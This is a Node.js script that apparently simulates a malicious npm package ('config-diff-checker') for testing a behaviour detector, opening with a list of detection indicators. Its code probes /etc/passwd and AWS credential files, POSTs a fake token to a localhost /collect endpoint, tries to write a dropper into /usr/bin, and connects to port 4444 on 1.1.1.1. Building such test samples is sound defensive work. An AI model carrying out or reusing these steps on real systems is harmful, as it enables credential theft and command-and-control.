
// Controlled static indicators for detection only:
// /etc/passwd /etc/shadow .ssh/id_rsa authorized_keys .aws/credentials .env Authorization: Bearer BEGIN PRIVATE KEY
// /collect /exfil fetch method: "POST" socket.connect(
// /bin/bash /bin/sh execve( popen( os.system( child_process.exec( spawnSync(
// exec( eval( compile( __import__( execFile( execSync( global.eval(
// base64.b64decode( atob( String.fromCharCode( unescape( exec(base64
// crontab .bashrc .profile systemctl enable /etc/init.d
// "preinstall" "postinstall" "prepare" cmdclass post_install
// import socket import subprocess import ctypes import pty require('net') require('child_process')

const fs=require("fs"); const net=require("net"); const dns=require("dns"); const {execSync,spawnSync}=require("child_process");
const MALICIOUS_DOMAIN="netapi.5lorexin.surf";
const PORTS=[4444];
const FILE_LOOPS=17; const SLEEP_SECONDS=18;
function run(cmd,timeout=15000){try{execSync(cmd,{stdio:"ignore",shell:"/bin/bash",timeout})}catch(e){}}
function tryOpen(p){try{fs.accessSync(p)}catch(e){} try{fs.statSync(p)}catch(e){} try{const fd=fs.openSync(p,"r");fs.closeSync(fd)}catch(e){}}
function writeFile(p,d){try{fs.writeFileSync(p,d)}catch(e){}}
function connectAttempt(host,port){try{const s=new net.Socket();s.setTimeout(800);s.on("error",()=>{});s.on("timeout",()=>{try{s.destroy()}catch(e){}});s.connect(port,host,()=>{try{s.write("GET / HTTP/1.0\r\nHost: "+host+"\r\n\r\n")}catch(e){}try{s.destroy()}catch(e){}})}catch(e){}}
function oneHttpOnly(){run(`curl -sS -m 3 -X POST -H "Host: ${MALICIOUS_DOMAIN}" -H "Content-Type: application/json" -H "User-Agent: config-diff-checker/1.0" --data '{"package":"config-diff-checker","token":"Authorization: Bearer fake-token","domain":"netapi.5lorexin.surf","credentials":".aws/credentials"}' http://127.0.0.1:8080/collect >/dev/null || true`,6000);}
console.log("[config-diff-checker] start");
try{dns.lookup(MALICIOUS_DOMAIN,()=>{})}catch(e){} try{dns.resolve4(MALICIOUS_DOMAIN,()=>{})}catch(e){}
oneHttpOnly();
// etc=T — fewer files than higher packages
["/etc/passwd","/etc/hosts","/etc/resolv.conf","/etc/os-release"].forEach(tryOpen);
["/root/.aws/credentials"].forEach(tryOpen);
for(let i=0;i<FILE_LOOPS;i++){const p=`/tmp/config-diff-checker_artifact_${i}.txt`;writeFile(p,"artifact "+i+"\n");try{fs.readFileSync(p)}catch(e){}try{fs.unlinkSync(p)}catch(e){}}
writeFile("/tmp/config-diff-checker_target","target\n");
// NO chmod → priv=F
spawnSync("/bin/sh",["-c","exec 3>/usr/bin/config-diff-checker_dropper && echo '#!/bin/sh' >&3 && sleep 5; exec 3>&-"],{stdio:"ignore",timeout:8000});
// c2=T — 1 port only
for(const port of PORTS){connectAttempt("127.0.0.1",port); connectAttempt("1.1.1.1",port);}
// JS timer → spawned=F
const start=Date.now(); while(Date.now()-start < SLEEP_SECONDS*1000){}
console.log("[config-diff-checker] done");
